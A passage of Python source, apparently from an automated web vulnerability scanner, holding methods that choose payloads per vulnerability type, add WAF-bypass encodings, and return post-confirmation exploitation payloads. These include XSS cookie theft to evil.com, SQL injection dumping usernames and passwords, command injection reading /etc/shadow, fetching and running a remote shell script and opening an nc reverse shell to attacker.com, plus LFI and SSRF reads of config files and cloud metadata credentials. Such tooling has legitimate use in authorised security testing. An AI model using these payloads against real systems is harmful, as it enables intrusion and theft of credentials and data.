    ) -> List[str]:
        """
        Get payloads for a vulnerability type.

        Args:
            vuln_type: Type of vulnerability to test
            endpoint: Target endpoint
            context: Additional context (technologies, WAF, etc.)

        Returns:
            List of payloads to test
        """
        base_payloads = self.payload_libraries.get(vuln_type, [])

        if not base_payloads:
            # Fallback to similar type
            for key in self.payload_libraries:
                if vuln_type.startswith(key.split('_')[0]):
                    base_payloads = self.payload_libraries[key]
                    break

        # If WAF detected, add encoded variants
        if context.get("waf_detected"):
            base_payloads = self._add_waf_bypasses(base_payloads, vuln_type)

        # Limit payloads based on scan depth
        depth = context.get("depth", "standard")
        limits = {
            "quick": 3,
            "standard": 10,
            "thorough": 20,
            "exhaustive": len(base_payloads)
        }
        limit = limits.get(depth, 10)

        return base_payloads[:limit]

    async def get_exploitation_payloads(
        self,
        vuln_type: str,
        initial_payload: str,
        context: Dict[str, Any]
    ) -> List[str]:
        """
        Generate exploitation payloads after initial vulnerability confirmation.
        """
        exploitation_payloads = []

        if "xss" in vuln_type:
            exploitation_payloads = [
                "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
                "<img src=x onerror=fetch('http://evil.com/'+document.cookie)>",
                "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
            ]
        elif "sqli" in vuln_type:
            exploitation_payloads = [
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns--",
                "' UNION SELECT username,password FROM users--",
            ]
        elif "command" in vuln_type:
            exploitation_payloads = [
                "; cat /etc/shadow",
                "; wget http://evil.com/shell.sh -O /tmp/s && bash /tmp/s",
                "| nc -e /bin/bash attacker.com 4444",
            ]
        elif "lfi" in vuln_type:
            exploitation_payloads = [
                "php://filter/convert.base64-encode/resource=../config.php",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
            ]
        elif "ssrf" in vuln_type:
            exploitation_payloads = [
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://127.0.0.1:6379/INFO",
                "http://127.0.0.1:3306/",
            ]

        return exploitation_payloads

    def _add_waf_bypasses(self, payloads: List[str], vuln_type: str) -> List[str]:
        """Add WAF bypass variants to payloads"""
        bypassed = []
        for payload in payloads:
            bypassed.append(payload)
            # URL encoding
            bypassed.append(payload.replace("<", "%3C").replace(">", "%3E"))
            # Double URL encoding
            bypassed.append(payload.replace("<", "%253C").replace(">", "%253E"))
            # Case variation
            if "<script" in payload.lower():
                bypassed.append(payload.replace("script", "ScRiPt"))
        return bypassed
